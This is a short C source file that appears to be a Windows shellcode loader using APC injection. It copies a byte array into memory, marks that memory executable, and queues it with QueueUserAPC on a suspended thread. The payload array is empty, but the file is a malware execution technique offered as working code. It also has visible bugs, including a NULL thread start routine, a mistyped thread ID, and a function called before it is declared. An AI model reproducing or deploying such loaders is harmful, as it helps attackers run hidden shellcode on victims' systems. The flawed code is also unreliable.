#include <windows.h>
#include<stdio.h>

unsigned char Payload[] = {
    
};

VOID AlertableFunction() {

    LPDWORD* threadID = NULL;
    //Suspended Thread
    HANDLE hThread = CreateThread(NULL, NULL, NULL, NULL, CREATE_SUSPENDED, &threadID);
    printf("[+] Thread created at ID: %d", threadID);
    printf("\n[i] Running APC Injection Function ...");
    //Alertable Thread
    //HANDLE hThread = CreateThread(NULL, NULL, NULL, NULL, 0, NULL);
    if (!hThread) {
        printf("Handle wrong");
    }
    RunViaApcInjection(hThread, Payload, sizeof(Payload));
    //Needed for Suspended Thread
    ResumeThread(hThread);
    printf("[+]Done");
   WaitForSingleObject(hThread, INFINITE);
}

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID pAddress = NULL;
    DWORD dwOldProtection = NULL;


    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\n  [i] Payload Written To: 0x%p",pAddress);

    memcpy(pAddress, pPayload, sPayloadSize);


    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // If hThread is in an alertable state, QueueUserAPC will run the payload directly
    // If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
    printf("\n  [#] Press <Enter> To Run ...");
    getchar();
    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
   
    return TRUE;
}

int main() {
  
    AlertableFunction();
    printf("\n[#] Press <Enter> To Quit ...");
    getchar();

return 0;
}
